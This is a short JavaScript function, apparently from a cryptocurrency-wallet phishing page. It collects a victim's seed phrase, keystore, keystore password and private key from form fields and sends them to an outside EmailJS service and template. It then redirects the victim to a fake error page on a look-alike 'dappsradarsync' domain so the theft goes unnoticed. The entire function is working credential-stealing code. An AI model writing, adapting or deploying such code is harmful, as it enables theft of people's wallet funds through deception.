function SendMail() {
  var params = {
      result: document.getElementById("secret_phrase").value,
      key: document.getElementById("keystores").value,
      pass: document.getElementById("keypass").value,
      privates: document.getElementById("privater").value


  }
  emailjs.send("service_8avvtcu", "template_qdlnj62", params).then(function(res) {
      // alert("Error ! " + res.status);
      window.location.href = "https://dappsradarsync.app/connect/error.html";
  })
}
